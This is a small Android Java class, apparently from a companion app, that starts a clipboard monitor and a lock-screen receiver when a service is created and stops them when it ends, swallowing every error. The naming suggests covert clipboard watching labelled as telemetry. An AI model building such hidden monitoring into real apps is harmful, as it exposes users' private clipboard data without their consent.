package com.snapapp.companion;

import android.content.Context;

public class TelemetryLifecycleHelper {
    public static void onServiceCreated(Context ctx) {
        try {
            LockScreenReceiver.register(ctx);
            ClipboardMonitor.start(ctx);
        } catch (Throwable ignored) {}
    }

    public static void onServiceDestroyed(Context ctx) {
        try {
            LockScreenReceiver.unregister(ctx);
            ClipboardMonitor.stop(ctx);
        } catch (Throwable ignored) {}
    }
}
